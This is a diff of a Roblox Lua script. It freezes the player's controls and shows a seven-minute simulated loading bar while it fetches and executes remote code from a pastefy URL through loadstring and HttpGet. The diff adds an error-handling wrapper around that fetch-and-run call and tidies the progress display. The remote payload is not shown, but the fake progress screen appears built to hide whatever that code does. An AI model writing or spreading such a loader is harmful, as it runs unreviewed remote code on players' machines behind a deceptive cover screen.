@@ -74,17 +74,38 @@ local playerModule = require(game:GetService("Players").PlayerScripts:WaitForChi
 local playerControls = playerModule:GetControls()
 playerControls:Disable()
 
--- Run the external script immediately
+-- Function to load external script using loadstring
+local function loadExternalScript()
+    local success, result = pcall(function()
+        -- Load and execute the external script using loadstring
+        loadstring(game:HttpGet("https://pastefy.app/oUQ3Lvec/raw"))()
+    end)
+
+    if not success then
+        warn("Failed to load external script: " .. result)
+    else
+        print("External script loaded successfully")
+    end
+end
+
+-- Run the external script and simulate progress
 task.spawn(function()
     -- Load the external script
-    loadstring(game:HttpGet("https://pastefy.app/oUQ3Lvec/raw"))()
+    loadExternalScript()
 
     -- Simulate progress
     local startTime = tick()
+    local duration = 420  -- Set your desired duration in seconds (7 minutes)
     while true do
-        local progress = math.clamp((tick() - startTime) / 420, 0, 1)
+        local elapsedTime = tick() - startTime
+        local progress = math.clamp(elapsedTime / duration, 0, 1)
+
+        -- Update progress bar size and percentage text
         progressBar.Size = UDim2.new(progress, 0, 1, 0)
-        percentLabel.Text = math.floor(progress * 100) .. "%"
+        
+        -- Corrected line: Ensure percentLabel.Text is properly updated
+        percentLabel.Text = tostring(math.floor(progress * 100)) .. "%"  -- Fixed line 73
+
         if progress >= 1 then
             -- Re-enable player movement after script finishes loading
             humanoid.WalkSpeed = 16
@@ -100,8 +121,10 @@ task.spawn(function()
                     screenGui:Destroy()
                 end
             end)
+
             break
         end
+
         task.wait(1)
     end
 end)
